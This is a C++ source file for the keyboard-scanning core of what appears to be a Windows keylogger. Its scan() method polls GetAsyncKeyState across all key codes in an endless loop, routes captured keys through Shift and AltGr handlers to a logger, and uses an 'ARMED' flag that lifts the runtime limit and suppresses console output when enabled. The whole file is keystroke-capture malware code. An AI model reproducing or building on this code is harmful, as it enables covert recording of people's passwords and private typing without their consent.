#include "pch.h"
#include "keyscan.h"

keyscan::keyscan(logging* logger) {
	m_logger = logger;
}

//Keyboard scanner
void keyscan::scan() {
	short counter = 0;
	char KEY = 'x';
	if constexpr (!ARMED) std::cout << "\n";
	while (true) {
		Sleep(1);
		for (int KEY = 8; KEY <= 255; KEY++) {
			if (GetAsyncKeyState(KEY) == -32767) {
				if (GetAsyncKeyState(VK_SHIFT))
					shift(KEY);
				else if (GetAsyncKeyState(VK_MENU))
					altgr(KEY);
				else
					mless(KEY);
			}
		}
		if constexpr (!ARMED) {
			if (counter > RUNTIME_MS)
				break;
			counter++;
		}
	}
}
